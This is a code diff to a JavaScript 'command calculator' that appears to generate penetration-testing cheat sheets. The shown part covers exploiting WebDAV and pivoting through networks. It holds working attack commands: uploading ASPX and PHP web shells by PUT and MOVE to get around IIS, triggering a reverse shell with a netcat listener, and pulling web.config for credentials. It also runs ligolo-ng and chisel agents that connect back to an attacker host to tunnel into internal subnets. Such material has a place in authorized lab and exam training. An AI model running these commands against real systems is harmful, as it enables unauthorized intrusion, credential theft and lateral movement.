+          { label: "1.2  OPTIONS — look for PUT in Allow", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i -E 'allow|dav'` },
+          { label: "1.3  Probe common dirs", cmd: `for d in / /webdav/ /dav/ /uploads/ /files/; do echo "== $d =="; curl -s -i -X OPTIONS http://${IP}$d | grep -i allow; done`, note: "PUT in the Allow line = you can upload there." },
         ]},
-        { phase: "Confirm what lands (davtest)", cmds: [
-          { label: "davtest", cmd: `davtest -url http://${IP}` },
-          { label: "davtest — authed", cmd: `davtest -url http://${IP} -auth ${Q}${U}:${SEC}${Q}`, note: `Domain box? try the prefixed form ${Q}${NB}\\${U}:${SEC}${Q}.` },
+        { phase: "2 — Confirm what lands (davtest)", cmds: [
+          { label: "2.1  davtest (unauth)", cmd: `davtest -url http://${IP}` },
+          { label: "2.2  davtest (authed)", cmd: `davtest -url http://${IP} -auth ${Q}${U}:${SEC}${Q}`, note: `Domain box? try the prefixed form ${Q}${NB}\\${U}:${SEC}${Q}.` },
+          { label: "2.3  READ the davtest output", cmd: `# 'PUT File: SUCCEED' + 'Executes: ...aspx: SUCCEED' is the win.\n# Note which extension EXECUTES, not just which uploads.`, note: "Reading, not running. An extension can upload but not execute — that column is the whole game." },
         ]},
-        { phase: "Upload → RCE (IIS bypass)", cmds: [
-          { label: "Make the shell (IIS / PHP)", cmd: `cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx\ncp /usr/share/webshells/php/php-reverse-shell.php shell.php`, note: "IIS runs .aspx; Apache/PHP runs .php. A .php shell on IIS just downloads as text." },
-          { label: "PUT .txt then MOVE to .aspx", cmd: `curl -s -u ${Q}${U}:${SEC}${Q} -X PUT http://${IP}/shell.txt --data-binary @shell.aspx\ncurl -s -u ${Q}${U}:${SEC}${Q} -X MOVE http://${IP}/shell.txt -H "Destination: http://${IP}/shell.aspx"`, note: "IIS blocks PUT of .aspx directly but allows .txt → MOVE renames server-side. Add --ntlm if it negotiates NTLM." },
-          { label: "Direct PUT (PHP stack)", cmd: `curl -s -u ${Q}${U}:${SEC}${Q} -X PUT http://${IP}/shell.php --data-binary @shell.php` },
-          { label: "Trigger it", cmd: `curl "http://${IP}/shell.aspx"   # browse to execute` },
+        { phase: "3 — Upload → RCE (IIS bypass)", cmds: [
+          { label: "3.1  Make the shell (match the stack)", cmd: `cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx\ncp /usr/share/webshells/php/php-reverse-shell.php shell.php`, note: "IIS runs .aspx; Apache/PHP runs .php. A .php shell on IIS just downloads as text." },
+          { label: "3.2  PUT .txt then MOVE to .aspx", cmd: `curl -s -u ${Q}${U}:${SEC}${Q} -X PUT http://${IP}/shell.txt --data-binary @shell.aspx\ncurl -s -u ${Q}${U}:${SEC}${Q} -X MOVE http://${IP}/shell.txt -H "Destination: http://${IP}/shell.aspx"`, note: "IIS blocks PUT of .aspx directly but allows .txt → MOVE renames server-side. Add --ntlm if it negotiates NTLM." },
+          { label: "3.3  Direct PUT (PHP stack)", cmd: `curl -s -u ${Q}${U}:${SEC}${Q} -X PUT http://${IP}/shell.php --data-binary @shell.php` },
         ]},
-        { phase: "Interactive (cadaver)", cmds: [
-          { label: "cadaver — open session", cmd: `cadaver http://${IP}/`, note: "Prompts for creds if WebDAV needs auth. Use the path OPTIONS confirmed." },
-          { label: "Inside the dav:/> prompt", cmd: `put shell.aspx              # upload your shell\nmove shell.txt shell.aspx   # IIS bypass: rename server-side\nls                          # list remote dir\nget web.config              # pull files (configs, creds)\nmkcol loot                  # make a dir\ndelete shell.aspx           # clean up when done`, note: "These are cadaver commands, not shell — type them at the dav:/> prompt." },
-          { label: "Non-interactive auth (~/.netrc)", cmd: `echo "machine ${IP} login ${U} password ${SEC}" >> ~/.netrc && chmod 600 ~/.netrc\ncadaver http://${IP}/`, note: "cadaver auto-reads ~/.netrc so it won't prompt." },
+        { phase: "4 — VERIFY it uploaded before triggering", cmds: [
+          { label: "4.1  Confirm the file is there", cmd: `curl -s -o /dev/null -w "%{http_code}\\n" http://${IP}/shell.aspx`, note: "200 = present. 404 = the MOVE/PUT didn't land — don't waste time hitting a shell that isn't there." },
+          { label: "4.2  Trigger it (listener up first)", cmd: `curl "http://${IP}/shell.aspx"`, note: "Start nc -lvnp <port> before this if it's a reverse shell." },
+        ]},
+        { phase: "5 — Interactive (cadaver)", cmds: [
+          { label: "5.1  Open a session", cmd: `cadaver http://${IP}/`, note: "Prompts for creds if WebDAV needs auth. Use the path OPTIONS confirmed." },
+          { label: "5.2  Inside the dav:/> prompt", cmd: `put shell.aspx              # upload your shell\nmove shell.txt shell.aspx   # IIS bypass: rename server-side\nls                          # list remote dir\nget web.config              # pull files (configs, creds)\ndelete shell.aspx           # clean up when done`, note: "These are cadaver commands, typed at the dav:/> prompt — not your shell." },
+          { label: "5.3  Non-interactive auth (~/.netrc)", cmd: `echo "machine ${IP} login ${U} password ${SEC}" >> ~/.netrc && chmod 600 ~/.netrc\ncadaver http://${IP}/`, note: "cadaver auto-reads ~/.netrc so it won't prompt." },
+        ]},
+        { phase: "6 — Error decoder", cmds: [
+          { label: "PUT returns 403 / 405", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i allow`, note: "PUT not in Allow = uploads are off on that path. Try a different dir from step 1.3." },
+          { label: "Uploaded but shell downloads as text", cmd: `# Wrong stack: .php on IIS or .aspx on Apache renders as text.\n# davtest's 'Executes' column told you which one runs — use that.`, note: "The classic WebDAV trap. Match the shell extension to what step 2.3 said executes." },
+          { label: "MOVE returns 409 Conflict", cmd: `# Destination dir doesn't exist or you lack write there.\n# MOVE within the SAME confirmed-writable dir.`, note: "Don't MOVE across directories unless both are writable." },
         ]},
       ],
     },
@@ -589,23 +717,36 @@ export default function CommandCalculator() {
     },
     tunnel: {
       name: "Tunneling / Pivot", groups: [
-        { phase: "ligolo-ng (preferred)", cmds: [
-          { label: "Kali — interface + listener", cmd: `sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert`, note: "Run once. In the ligolo console you'll get the agent session." },
-          { label: "Agent (on target)", cmd: `.\\agent.exe -connect ${LHOST}:11601 -ignore-cert`, note: "Linux target: ./agent -connect …" },
-          { label: "Route the internal subnet", cmd: `# in ligolo console: session → start\nsudo ip route add 10.10.20.0/24 dev ligolo`, note: "Now Kali tools hit the second-hop subnet directly." },
+        { phase: "0 — Before you tunnel", cmds: [
+          { label: "0.1  Confirm the second subnet exists", cmd: `# On the foothold, find networks Kali can't reach directly:\nip route          # linux target\nroute print       # windows target\nipconfig /all     # windows target`, note: "Reading, not running blind. You tunnel toward a subnet you've confirmed the pivot host can see." },
+          { label: "0.2  Match the agent to the target arch/OS", cmd: `file agent    # verify ELF vs PE before you transfer it`, note: "Wrong-arch agent silently fails to connect. Most common ligolo dead end." },
+          { label: "0.3  Serve the agent to the target", cmd: `python3 -m http.server 8000   # on Kali, then pull it from the target`, note: "Get the agent onto the pivot host first — you can't connect back without it there." },
         ]},
-        { phase: "chisel (SOCKS)", cmds: [
-          { label: "Kali — server", cmd: `./chisel server -p 8000 --reverse` },
-          { label: "Target — reverse SOCKS", cmd: `.\\chisel.exe client ${LHOST}:8000 R:socks`, note: "Then add 'socks5 127.0.0.1 1080' to /etc/proxychains4.conf." },
-          { label: "Use it", cmd: `proxychains nxc smb 10.10.20.10 ${nxcA()}` },
+        { phase: "1 — ligolo-ng (preferred)", cmds: [
+          { label: "1.1  Kali — interface + listener", cmd: `sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert`, note: "Run once. The ligolo console is where the agent session appears." },
+          { label: "1.2  Agent (on the target)", cmd: `.\\agent.exe -connect ${LHOST}:11601 -ignore-cert`, note: "Linux target: ./agent -connect … . Watch the Kali console for 'Agent joined'." },
+          { label: "1.3  Start the session + add the route", cmd: `# in the ligolo console:\nsession\n# pick the agent, then:\nstart\n# back on Kali:\nsudo ip route add 10.10.20.0/24 dev ligolo`, note: "The route uses the SECOND subnet, not the pivot's own IP." },
         ]},
-        { phase: "SSH port-forwarding", cmds: [
-          { label: "Local forward (reach internal svc)", cmd: `ssh -L 8080:10.10.20.10:80 ${U}@${IP}`, note: "Kali:8080 → internal host:80 through the foothold." },
-          { label: "Dynamic SOCKS", cmd: `ssh -D 1080 ${U}@${IP}`, note: "proxychains everything over 1080." },
-          { label: "Remote forward (expose Kali svc)", cmd: `ssh -R 8000:127.0.0.1:8000 ${U}@${IP}` },
+        { phase: "2 — VERIFY the tunnel is live", cmds: [
+          { label: "2.1  Route is installed", cmd: `ip route | grep ligolo`, note: "No line here = the ip route add didn't take. Nothing downstream will work." },
+          { label: "2.2  Reach a host that only exists past the pivot", cmd: `ping -c1 10.10.20.10`, note: "This is the moment you learn it works. Do it before wasting time on a scan that 'hangs'." },
+          { label: "2.3  Port-touch through the tunnel", cmd: `nmap -Pn -p 445,3389,5985 10.10.20.10`, note: "If ping is filtered, a port hit still proves the route. 'Host seems down' after this = genuinely down, not a tunnel bug." },
         ]},
-        { phase: "sshuttle (quick VPN-like)", cmds: [
-          { label: "Route a subnet through SSH", cmd: `sshuttle -r ${U}@${IP} 10.10.20.0/24`, note: "Transparent — no proxychains needed. Target needs python." },
+        { phase: "3 — chisel (SOCKS fallback)", cmds: [
+          { label: "3.1  Kali — server", cmd: `./chisel server -p 8000 --reverse` },
+          { label: "3.2  Target — reverse SOCKS", cmd: `.\\chisel.exe client ${LHOST}:8000 R:socks`, note: "Then add 'socks5 127.0.0.1 1080' to /etc/proxychains4.conf." },
+          { label: "3.3  VERIFY — proxychains sees the host", cmd: `proxychains -q nxc smb 10.10.20.10 ${nxcA()}`, note: "A clean SMB banner through proxychains confirms the SOCKS path. Timeout = chisel or conf is wrong." },
+        ]},
+        { phase: "4 — SSH forwarding (no upload needed)", cmds: [
+          { label: "4.1  Local forward (reach one internal svc)", cmd: `ssh -L 8080:10.10.20.10:80 ${U}@${IP}`, note: "Kali:8080 → internal:80 through the foothold. curl localhost:8080 to test." },
+          { label: "4.2  Dynamic SOCKS", cmd: `ssh -D 1080 ${U}@${IP}`, note: "proxychains everything over 1080." },
+          { label: "4.3  sshuttle (transparent, needs python on target)", cmd: `sshuttle -r ${U}@${IP} 10.10.20.0/24`, note: "No proxychains — routes the subnet like a VPN." },
+        ]},
+        { phase: "5 — Error decoder", cmds: [
+          { label: "'Agent joined' never prints", cmd: `file agent   # arch mismatch?\n# also: is ${LHOST} the tun0 IP the target can actually reach?`, note: "Wrong arch or wrong LHOST. The agent connects OUT, so LHOST must be routable from the target." },
+          { label: "RTNETLINK: File exists (ip route add)", cmd: `ip route del 10.10.20.0/24\nsudo ip route add 10.10.20.0/24 dev ligolo`, note: "Route already present, often from a previous run or colliding with your VPN. Delete then re-add." },
+          { label: "Tunnel up but scans still hang", cmd: `# ICMP is often filtered internally — that's not a tunnel failure.\nnmap -Pn -sT 10.10.20.10`, note: "-Pn skips host discovery; -sT (full connect) is what works reliably over SOCKS/tun." },
+          { label: "proxychains: connection refused", cmd: `tail -3 /etc/proxychains4.conf`, note: "Wrong port or 'socks4' instead of 'socks5'. ligolo needs NO proxychains — that's a chisel-only step." },
         ]},
       ],
     },
